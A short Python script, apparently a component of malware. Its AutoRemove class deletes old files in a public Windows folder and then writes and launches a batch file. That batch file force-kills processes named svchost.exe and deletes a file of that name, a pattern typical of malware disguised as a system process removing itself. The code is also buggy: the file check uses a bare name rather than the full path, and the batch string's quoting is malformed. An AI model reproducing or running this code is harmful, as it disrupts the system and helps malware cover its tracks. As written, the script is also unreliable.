
import os
import time

class AutoRemove():
    def __init__(self):
        #self.AutoRemove()
        pass
    def AutoRemove(self):
        now = time.time ()
        path = r"C:\Users\Public\Roaming"
        for f in os.listdir (path):
            if os.stat (os.path.join (path, f)).st_mtime < now - 7 * 86400:
                print(now)
                if os.path.isfile (f):
                    os.remove (os.path.join (path, f))
        with open (r"rem.bat", "w+") as f:
            xd = 'TASKKILL /IM "svchost.exe" ''\n' 'DEL "svchost.exe'
            f.write(xd)
            f.close()
        os.startfile(r"rem.bat")
